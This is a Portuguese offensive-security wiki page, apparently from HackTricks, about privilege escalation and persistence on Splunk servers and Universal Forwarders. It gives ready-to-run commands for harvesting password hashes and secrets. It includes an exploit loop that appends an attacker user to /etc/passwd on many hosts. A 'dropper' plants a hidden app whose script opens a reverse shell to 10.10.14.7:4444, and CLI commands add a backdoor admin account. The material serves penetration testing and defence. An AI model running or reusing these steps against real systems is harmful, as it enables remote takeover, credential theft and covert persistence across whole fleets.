# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Se, ao **enumerar** uma máquina **internamente** ou **externamente**, você encontrar o **Splunk em execução** (geralmente **8000** para a interface web e **8089** para a API de gerenciamento), credenciais válidas frequentemente podem ser convertidas em **execução de código** por meio da instalação de apps, scripted inputs ou ações de gerenciamento. Se o Splunk estiver sendo executado como **root**, isso frequentemente se torna uma **escalada de privilégios** imediata.

Se você precisa apenas da superfície de ataque remoto genérica, enumeração ou do caminho de RCE por upload de app, consulte:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Se você **já é root** e o serviço Splunk não estiver escutando apenas no localhost, você também pode roubar **hashes de senha do Splunk**, recuperar **secrets criptografados** ou enviar um **app malicioso** para manter a persistência localmente ou em vários forwarders.

## Arquivos Locais Interessantes

Ao obter acesso a um host executando Splunk ou Splunk Universal Forwarder, estes geralmente são os caminhos mais interessantes:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artefatos importantes:

- **`$SPLUNK_HOME/etc/passwd`**: usuários locais do Splunk e hashes de senha.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: chave usada pelo Splunk para criptografar secrets armazenados em vários arquivos `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: arquivo inicial de bootstrap do admin; útil em golden images e erros de provisionamento. Ele é ignorado se `etc/passwd` já existir.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: local onde scripted inputs são comumente habilitados.
- **`$SPLUNK_HOME/etc/deployment-apps/`** ou **`$SPLUNK_HOME/etc/apps/`**: bons locais para ocultar um app persistente ou revisar o que já está sendo distribuído.

## Resumo do Exploit do Splunk Universal Forwarder Agent

Para obter mais detalhes, consulte [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Este é apenas um resumo:<sup>[[1]](#references)</sup>

**Visão geral do exploit:**
Um exploit direcionado ao Splunk Universal Forwarder (UF) permite que atacantes com a **senha do agent** executem código arbitrário em sistemas que executam o agent, comprometendo potencialmente uma grande parte do ambiente.

**Por que funciona:**

- O serviço de gerenciamento do UF é comumente exposto na **TCP 8089**.
- Os atacantes podem se autenticar na API e instruir o forwarder a instalar um **app bundle malicioso**.
- A mesma primitiva pode ser usada localmente para **LPE** ou remotamente para **RCE**.
- Ferramentas públicas, como **SplunkWhisperer2**, criam o app bundle automaticamente e podem adaptar payloads para alvos Linux.

**Formas comuns de recuperar a senha:**

- Credenciais em texto claro em documentação, scripts, compartilhamentos ou automação de deployment.
- Hashes de senha dentro de `$SPLUNK_HOME/etc/passwd`, seguidos de cracking offline.
- Golden images ou sobras de provisionamento, como `user-seed.conf`.

**Impacto:**

- Execução de código no nível de SYSTEM/root em cada host comprometido.
- Deployment de apps persistentes, backdoors ou ransomware.
- Desativação ou adulteração da telemetria antes que os dados sejam encaminhados.

**Comando de exemplo para exploração:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits públicos utilizáveis:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistência via Scripted Inputs ou Malicious Apps

Se você tiver **acesso de escrita ao filesystem** como `root`/`splunk`, ou acesso autenticado para instalar apps, um mecanismo de persistência muito confiável é inserir um **app personalizado** com um **scripted input**.<sup>[[2]](#references)</sup> A própria documentação do Splunk espera que os scripted inputs estejam em um diretório de app e sejam habilitados a partir de `inputs.conf`.

Layout típico:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` mínimo:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper Linux rápido:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- O mesmo truque funciona no **Universal Forwarder** usando `/opt/splunkforwarder/etc/apps/`.
- Os attackers geralmente se misturam ao ambiente modificando um add-on legítimo em vez de criar um app obviamente malicioso.
- Em um **deployment server**, plantar um app malicioso dentro de `deployment-apps/` transforma-se em **persistence em toda a fleet**, porque os forwarders consultam o servidor, baixam apps atualizados e frequentemente reiniciam para aplicá-los.

## Roubo de Credenciais e Takeover de Admin

Se você consegue ler os arquivos locais do Splunk, geralmente há dois objetivos importantes: recuperar o **acesso de admin do Splunk** e recuperar **service credentials criptografadas**.

### Password hashes e usuários locais

O Splunk armazena os dados de autenticação local em `etc/passwd`. Dependendo do deployment, fazer cracking desse arquivo pode recuperar credenciais funcionais para a web UI e a management API.

Se você já possui credenciais válidas de **admin** e o Splunk usa seu backend de autenticação **native**, a própria CLI pode ser usada para persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` e valores criptografados

O Splunk usa `etc/auth/splunk.secret` para proteger valores sensíveis armazenados em vários arquivos de configuração. Se você conseguir roubar tanto o **secret** quanto os arquivos **`.conf`** relevantes, geralmente poderá recuperar ou reutilizar:

- shared secrets de forwarders/indexers, como `pass4SymmKey`
- senhas de private keys TLS, como `sslPassword`
- credenciais de bind LDAP, como `bindDNPassword`

Isso é útil para **lateral movement**, mesmo quando a própria senha do administrador do Splunk não pode ser crackeada.

### Abuso de `user-seed.conf`

`user-seed.conf` só é consumido durante a primeira inicialização ou quando `etc/passwd` não existe. Isso o torna menos útil em uma máquina ativa, mas muito interessante em:

- templates de instalação comprometidos
- container images
- workflows de provisioning unattended
- appliances nos quais o Splunk é reinicializado automaticamente

Nesses casos, inserir um `HASHED_PASSWORD` gerado com `splunk hash-passwd` oferece uma forma discreta de recuperar o acesso de administrador após o redeployment.

## Abusando de Queries do Splunk

Para mais detalhes, consulte [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Uma técnica recente útil consiste em abusar de **XSLT fornecido pelo usuário** em versões vulneráveis do Splunk Enterprise para transformar uma conta autenticada com poucos privilégios em **execução de comandos do SO** como o usuário `splunk`.

Fluxo de alto nível:

1. Autentique-se no Splunk.
2. Faça upload de um arquivo **XSL** malicioso por meio da funcionalidade de preview/upload.
3. Faça o Splunk renderizar os resultados da busca com essa stylesheet carregada a partir do diretório **dispatch**.
4. Use o payload XSLT para gravar um arquivo ou acionar a execução por meio do search pipeline do Splunk, por exemplo, alcançando funcionalidades internas como `runshellscript`.

A principal conclusão ofensiva é que esse caminho proporciona **RCE pós-autenticação sem precisar de app upload**. No Linux, normalmente ele concede acesso à conta **`splunk`**, que ainda é valiosa porque esse usuário geralmente é proprietário da application tree, pode ler secrets e pode instalar persistent apps que sobrevivem à perda do shell.

Um caminho representativo usado durante a exploração é:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Se o Splunk estiver sendo executado com privilégios excessivos, ou se o usuário `splunk` tiver acesso a scripts perigosos, unidades de serviço graváveis ou regras `sudo` inadequadas, isso se torna uma cadeia de **LPE** simples.

## Referências

- [1] [Abusing Splunk Forwarders For RCE And Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Beware of TraitorWare: Using Splunk for Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
